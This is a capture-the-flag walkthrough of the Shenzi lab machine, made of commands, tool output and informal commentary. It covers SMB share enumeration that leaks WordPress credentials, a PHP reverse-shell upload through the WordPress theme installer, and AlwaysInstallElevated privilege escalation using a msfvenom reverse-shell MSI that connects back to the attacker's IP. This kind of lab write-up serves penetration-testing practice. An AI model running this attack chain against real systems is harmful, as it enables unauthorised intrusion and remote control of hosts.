@@ -1,0 +1,207 @@
+																			                        Shenzi Walkthrough
+																																							
+Attacker's Machine: 192.168.45.205
+Victim's Machine: 192.168.237.55
+export IP=192.168.237.55
+
+nmapAutomator.sh -H $IP -t Full
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.237.55/dashboard/
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| http-title: Welcome to XAMPP
+|_Requested resource was https://192.168.237.55/dashboard/
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   NULL: 
+|_    Host '192.168.45.205' is not allowed to connect to this MariaDB server
+5040/tcp  open  unknown
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Enumeration
+139,445                   
+
+enum4linux -a $IP            # nothing
+
+smbclient -L $IP -N
+Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       Remote IPC
+        Shenzi          Disk
+        
+# Rule, always go for different tools, you might get different results. In this case smbclient showed the Shenzi share, while enum4linux returned jack shit.
+   Let's connect to the share and get it's contents.
+   
+smbclient //$IP/Shenzi -N 
+
+smb: \> dir
+  .                                                           D        0  Thu May 28 11:45:09 2020
+  ..                                                          D        0  Thu May 28 11:45:09 2020
+  passwords.txt                                         A      894  Thu May 28 11:45:09 2020
+  readme_en.txt                                        A     7367  Thu May 28 11:45:09 2020
+  sess_klk75u2q4rpgfjs3785h6hpipp           A     3879  Thu May 28 11:45:09 2020
+  why.tmp                                                A      213  Thu May 28 11:45:09 2020
+  xampp-control.ini                                   A      178  Thu May 28 11:45:09 2020
+  
+# Check if we can upload files, however we aren't allowed.
+
+cat readme_en.txt
+
+
+
+# Checking the passwords.txt file, we can see that there one more additional account for wordpress.
+
+
+
+WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   
+WordPress:
+
+   User: admin
+   Password: FeltHeadwallWight357
+   
+# Let's check the other files, why.tmp, sess_klk75u2q4rpgfjs3785h6hpipp and xampp-control.ini
+
+cat why.tmp
+
+Warum dieses tmp-Verzeichnis?
+Das braucht beispielweise PHP 
+f�r seine Sessions-Verwaltung.
+Also bitte nicht l�schen!
+
+Why this tmp-Folder?
+PHP need it for saving
+the Sessions. 
+So please do not delete it!
+
+so, we can only pressume that sess_klk75u2q4rpgfjs3785h6hpipp might be our session idenfitier ?
+
+# Let's check the webapp hosted at port 80 and 443, and see if we find anything interesting. 
+   Aparently we can directly access from the GUI the phpinfo.php file and we can get some good data from it.
+
+C:\Users\shenzi
+
+Document root
+C:/xampp/htdocs
+
+Enumeration port 80
+
+https://192.168.237.55/xampp/                 # nothing really usefull
+
+# We saw that we have credentials for wordpress however, nothing was found after enumeration was done. So, it's there is wordpress on our web app, we most likely need to find the correct directory first.
+   Honestly, CTF machines solutions are for morons, but aparenty you need to think that a possible solution would be to have Shenzi as a directory name. What a crock of shit.
+   
+http://192.168.237.55/shenzi/
+
+
+# Let's log in with the admin credentials admin / FeltHeadwallWight357
+   We already know if you have an administrator account on wordpress, you can obtain RCE very easily through multiple methods.
+   
+ https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php   
+ 
+   Get a php reverse_shell ready and try to upload it in  • Appearance ◇ Themes ▪ Add new - Upload Theme → Add the reverse_shell payload
+   
+rlwrap nc -lvnp 4444  
+  
+⇒ Visit: /wp-content/uploads/2023/02/reverse_shell.php
+⇒ You can Visit Media, switch to list view and you should see the shell.php file there
+
+
+
+# Good we have shell on the machine. Get quickly grab the local flag and go after privilege escalation.
+
+cd C:\Users\shenzi\Desktop
+more local.txt
+54dec60a37a8e6b5faf2e124b6d19311
+
+whoami /priv                    # standard user privileges
+
+Privilege Name                               Description                                             State   
+============================= ==================================== ========
+SeShutdownPrivilege                   Shut down the system                             Disabled
+SeChangeNotifyPrivilege              Bypass traverse checking                         Enabled 
+SeUndockPrivilege                      Remove computer from docking station     Disabled
+SeIncreaseWorkingSetPrivilege     Increase a process working set                 Disabled
+SeTimeZonePrivilege                   Change the time zone                              Disabled
+
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)" /c:"System Boot Time" /c:"Windows Directory"
+Host Name:                     SHENZI
+OS Name:                       Microsoft Windows 10 Pro
+OS Version:                    10.0.19042 N/A Build 19042
+System Boot Time:          8/1/2023, 1:51:37 PM
+System Type:                  x64-based PC
+Windows Directory:         C:\WINDOWS
+Hotfix(s):                       6 Hotfix(s) Installed.
+Network Card(s):            1 NIC(s) Installed.
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+Description                           HotFixID         InstalledOn  
+Update                                 KB5007289      12/3/2021    
+Update                                 KB4562830      12/3/2021    
+Security Update                     KB5010342      8/1/2023     
+Update                                 KB5006753      12/3/2021    
+Update                                 KB5007273      12/3/2021    
+Security Update                     KB5011352       4/12/2022
+
+cmdkey /list
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=XboxLive
+    Type: Generic 
+    Saved for this logon only
+
+
+# Ok, let's run winpeas for a quick check.
+
+
+
+# This seems interesting, let's check manually to confirm
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+    
+# Now that we have confirmation, let's go for exploitation
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=5555 -a x64 --platform Windows -f msi -o evil.msi
+
+# Transfer the payload on the machine and run the exploit command
+
+rlwrap nc -lvnp 5555
+
+msiexec /quiet /qn /i C:\Users\shenzi\Desktop\evil.msi
+
+
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+8a4061111996812a26eb739a59f8be1b
